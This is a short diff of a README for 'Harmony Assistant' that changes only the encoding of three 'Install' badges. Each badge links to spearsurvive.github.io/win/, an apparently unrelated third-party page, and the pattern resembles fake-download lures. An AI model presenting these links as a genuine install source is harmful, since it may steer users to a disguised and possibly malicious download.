@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Harmony Assistant](https://img.shields.io/badge/⬇_Install_Harmony%20Assistant-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Harmony Assistant](https://img.shields.io/badge/⬇_Install_Harmony+Assistant-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Harmony Assistant is a comprehensive music composition, notation, and MIDI playb
 
 <div align="center">
 
-[![⬇ Install Harmony Assistant](https://img.shields.io/badge/⬇_Install_Harmony%20Assistant-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Harmony Assistant](https://img.shields.io/badge/⬇_Install_Harmony+Assistant-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Harmony Assistant is a comprehensive music composition, notation, and MIDI playb
 
 <div align="center">
 
-[![⬇ Install Harmony Assistant](https://img.shields.io/badge/⬇_Install_Harmony%20Assistant-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Harmony Assistant](https://img.shields.io/badge/⬇_Install_Harmony+Assistant-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
